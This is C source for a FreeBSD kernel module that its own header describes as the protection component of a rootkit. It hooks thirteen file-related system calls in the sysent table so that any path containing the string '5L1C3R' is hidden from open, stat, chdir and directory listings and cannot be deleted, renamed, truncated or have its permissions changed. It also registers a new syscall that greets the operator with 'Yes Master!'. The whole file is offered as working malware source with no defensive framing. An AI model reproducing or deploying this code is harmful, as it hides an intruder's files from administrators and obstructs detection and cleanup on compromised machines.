/*
 * Name:
 *      Protector
 * Description:
 *      A system call module that protects the rootkit
 * Usage:
 *      TODO: Add usage here
 * Author:
 *      Hai Lang
 * Date Created:
 *      2013-02-15
 * Last Update:
 *      2013-02-24
 *
 * TODO:
 *      1. Hide modules from kldstat
 *      2. Prevent modules from unloading
 *      3. Hide processes
 *      4. Prevent processes from getting killed
 *      5. Hide connections
 *      6. Prevent connections from being closed
*/
/* General Headers */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>

/* System Call Headers */
#include <sys/syscall.h>
#include <sys/stat.h>

/* Directory Headers */
#include <sys/dirent.h>

/* Options */
#define KERNDEBUG 1
#define HIDDENDIR "5L1C3R"

/* protector implementing function */
static int protector(struct thread *td, void *syscall_args)
{
    uprintf("Yes Master! Welcome!\n");
    return (0);
}

/*
 * ====================Immutability Hooks====================
 * unlink_hook, rmdir_hook, rename_hook
 * ==========================================================
*/
/* unlink hook - prevent file removal */
static int unlink_hook(struct thread *td, void *syscall_args)
{
    struct unlink_args /* {
            const char *path //path to the file to be removed
            }*/*args;
    args = (struct unlink_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if (copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        /* Error Copying Path */
        return (EFAULT);
    }

    /* All files under HIDDENDIR should be protected */
    if (strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_unlink(td, syscall_args));
}

/* rmdir hook - Prevent directory removal */
static int rmdir_hook(struct thread *td, void *syscall_args)
{
    struct rmdir_args /* {
            const char *path //Path to the directory to be removed
            }*/*args;
    args = (struct rmdir_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if (copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        /* Error Copying Path */
        return (EFAULT);
    }

    /* Check if the directory to be deleted contains the HIDDENDIR */
    if (strstr(path, HIDDENDIR)) {
        /* As long as the path contains the hidden directory name */
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_rmdir(td, syscall_args));
}

/* remane hook - Prevent file/directory name change */
static int rename_hook(struct thread *td, void *syscall_args)
{
    struct rename_args /*{
        const char *from;
        const char *to;
    }*/*args;
    args = (struct rename_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if (copyinstr(args->from, path, NAME_MAX, &copied) == EFAULT) {
        /* Error Copying Path */
        return (EFAULT);
    }

    /* Check if the from path contains the HIDDENDIR */
    if (strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_rename(td, syscall_args));
}

/* chmod hook - prevent file/directory mode modification */
static int chmod_hook(struct thread *td, void *syscall_args)
{
    struct chmod_args /*{
        const char *path; //Path to the directory/file to be changed
        mode_t mode;
    }*/*args;
    args = (struct chmod_args *)syscall_args;

    /* TODO: Do I need to hide login info here as well? */
    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        /* Error Copying Path */
        return (EFAULT);
    }

    /* Check if the path contains the HIDDENDIR */
    if (strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_chmod(td, syscall_args));
}

/* chown hook - prevent file/directory ownership change */
static int chown_hook(struct thread *td, void *syscall_args)
{
    struct chown_args /*{
        const char *path; //path to the file/directory to be changed
        uid_t owner;
        gid_t group;
    }*/ *args;
    args = (struct chown_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        /* Error Copying Path */
        return (EFAULT);
    }

    /* Check if the path contains the HIDDENDIR */
    if(strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_chown(td, syscall_args));
}

/* chflags hook - prevent file/directory flag changing */
static int chflags_hook(struct thread *td, void *syscall_args)
{
    struct chflags_args /*{
        const char *path;
        u_long flags;
    }*/ *args;
    args = (struct chflags_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        /* Error Copying Path */
        return (EFAULT);
    }

    /* Check if the path contains the HIDDENDIR */
    if(strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_chflags(td, syscall_args));
}

/* utimes hook - prevent file/directory access and modification time change */
static int utimes_hook(struct thread *td, void *syscall_args)
{
    struct utimes_args /*{
        const char *path;
        const struct timeval *times;
    }*/ *args;
    args = (struct utimes_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        /* Error Copying Path */
        return (EFAULT);
    }

    /* Check if the path contains the HIDDENDIR */
    if(strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_utimes(td, syscall_args));
}

/* truncate hook - prevent file truncating */
static int truncate_hook(struct thread *td, void *syscall_args)
{
    struct truncate_args /*{
        const char *path;
        off_t length;
    }*/ *args;
    args = (struct truncate_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        /* Error Copying Path */
        return (EFAULT);
    }

    /* Check if the path contains the HIDDENDIR */
    if(strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_truncate(td, syscall_args));
}
/*
 * ==================Invisibility Hooks=================
 * open_hook, chdir_hook, getdirentries_hook
 * =====================================================
*/
/* open hook - prevent hiddendir and files under it to be shown or opended */
static int open_hook(struct thread *td, void *syscall_args)
{
    struct open_args /*{
        const char *path;
        int flags;
    }*/*args;
    args = (struct open_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        /* Error Copying Path */
        return (EFAULT);
    }

    /* Check if directory/file to be opened contains HIDDENDIR */
    if (strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_open(td, syscall_args));
}

/* stat hook - Hide file/directory status */
static int stat_hook(struct thread *td, void *syscall_args)
{
    struct stat_args /*{
        const char *path;
        struct stat *sb;
    }*/ *args;
    args = (struct stat_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        /* Error Copying Path */
        return (EFAULT);
    }

    /* Check if directory/file to be checked contains HIDDENDIR */
    if(strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_stat(td, syscall_args));
}

/* lstat hook - Hide file/direcotry status */
static int lstat_hook(struct thread *td, void *syscall_args)
{
    struct lstat_args /*{
        const char *path;
        struct stat *sb;
    }*/ *args;
    args = (struct lstat_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        return (EFAULT);
    }

    /* Check if directory/file to be checked contains HIDDENDIR */
    if(strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original sytem call */
    return (sys_lstat(td, syscall_args));
}

/* chdir hook - prevent directory traversal to the hiddendir */
static int chdir_hook(struct thread *td, void *syscall_args)
{
    struct chdir_args /*{
        const char *path; //Path to change current working directory to
    }*/*args;
    args = (struct chdir_args *)syscall_args;

    /* Copy arguments to kernel space */
    char path[NAME_MAX];
    size_t copied;
    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
        /* ERROR Copying Path */
        return (EFAULT);
    }

    /* Check if the target directory path contains HIDDENDIR */
    if (strstr(path, HIDDENDIR)) {
        return (ENOENT);
    }

    /* Otherwise, call the original system call */
    return (sys_chdir(td, syscall_args));
}

/* getdirentries hook - hide file/directory */
static int getdirentries_hook(struct thread *td, void *syscall_args)
{
    struct getdirentries_args /* {
                int fd, //[man]file descriptor
                char *buf, //[man]buffer space, results will be returned to here
                int nbytes, //[man]Up to nbytes of data will be transferred
                            //[man]Must be greater or equal to the filesystem block size
                long *basep
            }*/*args;
    args = (struct getdirentries_args *)syscall_args;

    /* Intialize dirent structs in kernel space */
    struct dirent /* {
                u_int32_t d_fileno, //[man]Unique number for each distinct file
                u_int16_t d_reclen, //[man]The length of the directory record, in bytes
                                    //[man]Can be used as an offset to the next entry
                u_int8_t d_type, //[man]The type of the file pointed to by the directory record
                u_int8_t d_namelen, //[man]Length of the filename excluding null byte.
                char d_name[MAXNAMELEN + 1] //[man]Null terminated file name
                }*/*dirptr, *currptr;
    unsigned int tbytes, count, reclen;
    int flag = 0;

    /* call the original getdirentries */
    sys_getdirentries(td, syscall_args);
    tbytes = td->td_retval[0]; //[bsdkern]Actual transferred bytes returned by the system call

    /* Don't bother to do anything if the directory is empty */
    if(tbytes > 0) {
        /* Allocate memory for dirent structs in kernel space */
        MALLOC(dirptr, struct dirent *, tbytes, M_TEMP, M_NOWAIT);

        /* Copy buf to dirptr in kernel space */
        copyin(args->buf, dirptr, tbytes);

        currptr = dirptr;
        count = tbytes;

        /* Iterate through the directory entries */
        while (count > 0) {
            reclen = currptr->d_reclen;
            count -= reclen;

            /* Check if the entry name matches the hide config */
            //if (strcmp((char *)&(currptr->d_name), (char *)HIDDENDIR) == 0){
            if (strstr((char *)&(currptr->d_name), (char *)HIDDENDIR)) {
                /* If the currptr is pointing to the last entry, no need to remove */
                if (count != 0) {
                    /* Copy the rest of entries to the address of current node, overwrite the hidden file */
                    bcopy((char *)currptr + reclen, currptr, count);
                    flag = 1;
                }
                /* Modify transferred bytes */
                tbytes -= reclen;
            }

            /* The last directory entry always has a d_reclen of 0. Check to avoid infinite loop */
            if (currptr->d_reclen == 0) {
                /* Break the loop */
                count = 0;
            }

            /* Check if there's anymore to loop */
            if (count != 0 && flag == 0) {
                /* Point the currptr to the next entry using d_reclen */
                currptr = (struct dirent *)((char *)currptr + reclen);
            }
            flag = 0;
        }

        /* Adjust the transferred bytes return value to reflect any changes made */
        td->td_retval[0] = tbytes;
        /* Then copy the manipulated result back to user space buffer */
        copyout(dirptr, args->buf, tbytes);

        /* Free kernel variables */
        FREE(dirptr, M_TEMP);
    }

    return(0);
}

/* Prepare sysent to register the new system call */
static struct sysent getdirentries_hook_sysent = {
    1,  /* Number of arguments */
    protector /* implementing function */
};

/* Define the offset in sysent[] where the new system call is to be allocated */
static int offset = NO_SYSCALL; /* Default, using the next available slots offset in sysent table */

/* Event handler function for the new system call */
static int load(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch(cmd) {
        case MOD_LOAD:
            #if KERNDEBUG == 1
            uprintf("Hooking getdirentries, unlink, rmdir, open, chdir, rename....\n");
            #endif
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
            sysent[SYS_unlink].sy_call = (sy_call_t *)unlink_hook;
            sysent[SYS_rmdir].sy_call = (sy_call_t *)rmdir_hook;
            sysent[SYS_open].sy_call = (sy_call_t *)open_hook;
            sysent[SYS_chdir].sy_call = (sy_call_t *)chdir_hook;
            sysent[SYS_rename].sy_call = (sy_call_t *)rename_hook;
            sysent[SYS_chmod].sy_call = (sy_call_t *)chmod_hook;
            sysent[SYS_chown].sy_call = (sy_call_t *)chown_hook;
            sysent[SYS_truncate].sy_call = (sy_call_t *)truncate_hook;
            sysent[SYS_stat].sy_call = (sy_call_t *)stat_hook;
            sysent[SYS_lstat].sy_call = (sy_call_t *)lstat_hook;
            sysent[SYS_chflags].sy_call = (sy_call_t *)chflags_hook;
            sysent[SYS_utimes].sy_call = (sy_call_t *)utimes_hook;
            break;
        case MOD_UNLOAD:
            #if KERNDEBUG == 1
            uprintf("Unhooking getdirentries, unlink, rmdir, open, chdir, rename....\n");
            #endif
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
            sysent[SYS_unlink].sy_call = (sy_call_t *)sys_unlink;
            sysent[SYS_rmdir].sy_call = (sy_call_t *)sys_rmdir;
            sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
            sysent[SYS_chdir].sy_call = (sy_call_t *)sys_chdir;
            sysent[SYS_rename].sy_call = (sy_call_t *)sys_rename;
            sysent[SYS_chmod].sy_call = (sy_call_t *)sys_chmod;
            sysent[SYS_chown].sy_call = (sy_call_t *)sys_chown;
            sysent[SYS_truncate].sy_call = (sy_call_t *)sys_truncate;
            sysent[SYS_stat].sy_call = (sy_call_t *)sys_stat;
            sysent[SYS_lstat].sy_call = (sy_call_t *)sys_lstat;
            sysent[SYS_chflags].sy_call = (sy_call_t *)sys_chflags;
            sysent[SYS_utimes].sy_call = (sy_call_t *)sys_utimes;
            break;
        default:
            error = EOPNOTSUPP; /* Operation not supported */
            break;
    }

    return(error);
}

/* Declare and register the system call module */
SYSCALL_MODULE(protector, &offset, &getdirentries_hook_sysent, load, NULL);
